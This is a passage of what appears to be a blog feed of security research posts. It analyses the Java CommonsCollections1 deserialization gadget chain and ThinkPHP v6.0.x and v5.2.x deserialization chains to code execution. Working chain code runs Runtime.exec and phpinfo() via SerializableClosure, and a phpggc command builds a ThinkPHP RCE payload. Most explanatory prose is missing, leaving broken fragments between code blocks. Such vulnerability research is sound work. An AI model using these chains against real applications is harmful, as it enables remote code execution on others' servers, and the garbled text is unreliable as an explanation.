class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);<span class="comment">// </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Transformer</code>CommonCollections1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">      <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),// <span class="title">Runtime</span></span></span><br><span class="line">      new InvokerTransformer("getMethod", new Class[] &#123;//Runtime.getRuntime()</span><br><span class="line">         String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">         <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">      <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;<span class="comment">// invoke,invokeRuntime.getRuntime()Runtime</span></span><br><span class="line">         Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">         <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">      <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,<span class="comment">// exec</span></span><br><span class="line">         <span class="keyword">new</span> Class[] &#123; String<span class="class">.<span class="keyword">class</span> &#125;, <span class="title">execArgs</span>),</span></span><br><span class="line"><span class="class">      <span class="title">new</span> <span class="title">ConstantTransformer</span>(1) &#125;</span>;</span><br></pre></td></tr></table></figure><p><code>ConstantTransformer</code>transformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;<span class="comment">// iConstantRuntime.class</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;<span class="comment">// Runtime.class</span></span><br><span class="line">  <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Object obj = Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Class cls = obj.getClass();</span><br><span class="line">Method method;</span><br><span class="line">method = cls.getMethod("getMethod",new Class[] &#123;String.class, Class[].class &#125;);</span><br><span class="line">obj = method.invoke(obj, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;);</span><br><span class="line">cls = obj.getClass();</span><br><span class="line">method = cls.getMethod("invoke",new Class[] &#123;Object.class, Object[].class &#125;);</span><br><span class="line">obj = method.invoke(obj, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;);</span><br><span class="line">cls = obj.getClass();</span><br><span class="line">method = cls.getMethod(<span class="string">"exec"</span>,<span class="keyword">new</span> Class[] &#123; String<span class="class">.<span class="keyword">class</span> &#125;)</span>;</span><br><span class="line">method.invoke(obj, <span class="keyword">new</span> String[] &#123; <span class="string">"open /System/Applications/Calculator.app"</span> &#125;);</span><br></pre></td></tr></table></figure><p><code>ChainedTransformer</code>transformxxxTransformer<code>LazyMap.get</code><code>TransformedMap.checkSetValue</code>checkSetValuesetValue</p><p></p><p>readObjectreadObject</p><p>readObjectMap(getsetValue)</p><p>exp<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><p>readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">  s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">  AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    annotationType = AnnotationType.getInstance(type);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">    <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">  <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">  <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">    String name = memberValue.getKey();</span><br><span class="line">    Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">    <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">      Object value = memberValue.getValue();</span><br><span class="line">      <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">            value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">        memberValue.setValue(</span><br><span class="line">          <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">            value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">            annotationType.members().get(name)));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>26memberValue.setValuememberValueTransformedMap</p><p>TransformedMapvalueTransformerChainedTransformer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sun.reflect.annotation.AnnotationInvocationHandler.readObject()</span><br><span class="line">  -&gt; memberValue.setValue() =&gt; TransformedMap.setValue() =&gt; TransformedMap.checkSetValue()</span><br><span class="line">  -&gt; valueTransformer.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">  -&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><p>LazyMap.get()</p><p>CommonsCollections1AnnotationInvocationHandler.invoke</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">    String member = method.getName();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"toString"</span>:</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"hashCode"</span>:</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"annotationType"</span>:</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">    Object result = memberValues.get(member);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>15memberValues.getmemberValuesLazyMap</p><p>invokeProxyinvoke</p><p>ProxyAnnotationInvocationHandlermemberValuesLazyMapAnnotationInvocationHandler.readObject19memberValues.entrySetinvokeentrySettoStringhashCodeannotationType15</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sun.reflect.annotation.AnnotationInvocationHandler.readObject()</span><br><span class="line">  -&gt; memberValues.entrySet()</span><br><span class="line">  -&gt; AnnotationInvocationHandler.invoke()</span><br><span class="line">  -&gt; memberValues.get() =&gt; LazyMap.get()</span><br><span class="line">  -&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">  -&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><p>ysoserialCommonsCollections1</p><p></p><h1 id="0x04-"><a href="#0x04-" class="headerlink" title="0x04 "></a>0x04 </h1><p>ysoserialJavaexp</p><p>CommonCollections13override.classAnnotationjdk8payloadjdk7<a href="!http://www.thegreycorner.com/2016/05/commoncollections-deserialization.html"></a></p><p>javassistjarclass</p><p>ProxyJava</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code Reviewthinkphp v6.0.x </title>
      <link href="2019/09/10/php-thinkphp-6-0-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/"/>
      <url>2019/09/10/php-thinkphp-6-0-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h1><p>tp 5.2.xtp6.0.x<br><a id="more"></a></p><h1 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h1><p>composer6.0.*-dev</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=6.0.x-dev v6.0</span><br></pre></td></tr></table></figure><h1 id="0x02-"><a href="#0x02-" class="headerlink" title="0x02 "></a>0x02 </h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>v6.0.x</p><p>5.2.x</p><p>5.1.x5.2.x<code>Windows</code><code>__destruct</code>,6.0.x<code>Windows</code></p><h2 id="vendor-topthink-think-orm-src-Model-php-"><a href="#vendor-topthink-think-orm-src-Model-php-" class="headerlink" title="vendor/topthink/think-orm/src/Model.php "></a>vendor/topthink/think-orm/src/Model.php </h2><p><code>__toString</code>5.2.x(wonderkun)</p><p><code>__destruct</code><code>__wakeup</code><code>vendor/topthink/think-orm/src/Model.php</code><code>__destruct</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;<span class="comment">// lazySavetruesave</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(array $data = [], string $sequence = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $result = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData($sequence);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>lazySave</code><code>true</code>,<code>save</code></p><p><code>updateData</code>return</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">(string $event)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p><code>isEmpty</code><code>false</code><code>$this-&gt;trigger(&#39;BeforeWrite&#39;)</code><code>true</code></p><ol><li><code>$this-&gt;data</code></li><li><code>$this-&gt;withEvent</code><code>false</code></li><li><code>$this-&gt;exists</code><code>true</code></li></ol><p><code>updateData</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeUpdate'</span>)) &#123;<span class="comment">// </span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;getChangedData();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;autoRelationUpdate();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    $allowFields = <span class="keyword">$this</span>-&gt;checkAllowFields(); <span class="comment">// __toString</span></span><br></pre></td></tr></table></figure><p><code>return</code><code>$data</code><code>getChangedData</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;force ? <span class="keyword">$this</span>-&gt;data : array_udiff_assoc(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;origin, <span class="function"><span class="keyword">function</span> <span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">empty</span>($a) || <span class="keyword">empty</span>($b)) &amp;&amp; $a !== $b) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> is_object($a) || $a != $b ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$this-&gt;force</code><code>true</code><code>$this-&gt;data</code></p><p><code>checkAllowFields</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;field)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;schema)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = array_keys(array_merge(<span class="keyword">$this</span>-&gt;schema, <span class="keyword">$this</span>-&gt;jsonType));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $query = <span class="keyword">$this</span>-&gt;db();<span class="comment">// __toString</span></span><br><span class="line">            $table = <span class="keyword">$this</span>-&gt;table ? <span class="keyword">$this</span>-&gt;table . <span class="keyword">$this</span>-&gt;suffix : $query-&gt;getTable();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;field;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$this-&gt;db()</code></p><ol><li><code>$this-&gt;field</code></li><li><code>$this-&gt;schema</code></li></ol><p></p><p><code>__toString</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span><span class="params">($scope = [])</span>: <span class="title">Query</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">    $query = <span class="keyword">self</span>::$db-&gt;connect(<span class="keyword">$this</span>-&gt;connection)</span><br><span class="line">        -&gt;name(<span class="keyword">$this</span>-&gt;name . <span class="keyword">$this</span>-&gt;suffix)<span class="comment">// toString</span></span><br><span class="line">        -&gt;pk(<span class="keyword">$this</span>-&gt;pk);</span><br></pre></td></tr></table></figure><p></p><p><code>connect</code><code>$this-&gt;connection</code><code>mysql</code><code>$this-&gt;name</code><code>$this-&gt;suffix</code><code>__toString</code></p><p><code>vendor/topthink/think-orm/src/model/concern/Conversion.php</code><code>__toString</code></p><p>exp<a href="https://github.com/wh1t3p1g/phpggc" target="_blank" rel="noopener">phpggc</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -u ThinkPHP/RCE2 <span class="string">'phpinfo();'</span></span><br></pre></td></tr></table></figure><p>SerializableClosure</p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code Reviewthinkphp v5.2.x </title>
      <link href="2019/09/10/php-thinkphp-5-2-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/"/>
      <url>2019/09/10/php-thinkphp-5-2-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h1><p>N1CTFthinkphp5<br><a id="more"></a></p><p>wonderkun</p><h1 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h1><p>composer5.2.*-dev</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.2.x-dev v5.2</span><br></pre></td></tr></table></figure><h1 id="0x02-"><a href="#0x02-" class="headerlink" title="0x02 "></a>0x02 </h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>tp5Windows<a href="[https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/](https://blog.riskivy.com/thinkphp/"></a>)<code>__toString</code>PHP</p><p>5.1.37<code>think/Request.php</code> <code>__call</code>5.2.x<code>__call</code><code>__call</code></p><p>5.2.x</p><h2 id="think-model-concern-Attribute-php-getValue"><a href="#think-model-concern-Attribute-php-getValue" class="headerlink" title="think/model/concern/Attribute.php getValue"></a>think/model/concern/Attribute.php getValue</h2><p>5.1.37<code>__call</code>5.2.x</p><p>ConversiontoArray</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    $data = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">            $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);<span class="comment">// relationvisiblekey</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p><code>$this-&gt;visible</code><code>$this-&gt;relation</code><code>getAttr</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">(string $name, $value, bool $relation = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);<span class="comment">// $name</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;withAttr[$fieldName])) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName]; <span class="comment">// withAttr</span></span><br><span class="line">    $value   = $closure($value, <span class="keyword">$this</span>-&gt;data); <span class="comment">// </span></span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p><code>getValue</code>phptpSerializableClosure</p><p><a href="https://github.com/opis/closure" target="_blank" rel="noopener">\Opis\Closure</a><code>$closure($value, $this-&gt;data)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$func = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;phpinfo();&#125;;</span><br><span class="line">$closure = <span class="keyword">new</span> \Opis\Closure\SerializableClosure($func);</span><br><span class="line">$closure($value, <span class="keyword">$this</span>-&gt;data);<span class="comment">// </span></span><br></pre></td></tr></table></figure><p>phpinfo</p><p></p><ol><li><code>vendor/topthink/framework/src/think/process/pipes/Windows.php</code><br>  <code>__destruct</code> -&gt;<code>removeFiles</code> -&gt;<code>file_exists</code> <code>filename</code><code>filename</code><br> <code>__toString</code><code>__toString</code></li><li><code>vendor/topthink/framework/src/think/model/concern/Conversion.php</code><br> <code>__toString</code> -&gt; <code>toJson</code> -&gt; <code>toArray</code><code>relation</code><code>visible</code>-&gt; <code>getAttr</code><br> <code>vendor/topthink/framework/src/think/model/concern/Attribute.php</code><code>getValue</code></li><li><code>vendor/topthink/framework/src/think/model/concern/Attribute.php</code><br><code>getValue</code> -&gt; 